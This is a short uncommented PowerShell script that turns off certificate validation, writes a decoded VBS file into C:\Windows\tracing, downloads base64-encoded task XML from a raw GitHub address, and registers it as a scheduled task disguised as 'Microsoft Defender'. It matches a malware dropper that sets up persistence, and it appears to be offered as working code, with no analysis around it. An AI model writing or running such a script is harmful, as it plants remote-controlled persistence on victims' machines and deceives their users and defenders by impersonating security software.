[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$TaskComb64="";
[IO.File]::WriteAllText("C:\Windows\tracing\TaskCom.vbs", [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($TaskComb64)));
$XMLb64=(Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Sim000n3/run/main/task.txt" -Headers @{"Cache-Control"="no-cache"}).Content;
$XML=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($XMLb64));
Register-ScheduledTask -Xml ($XML | Out-String) -TaskName "Microsoft Defender"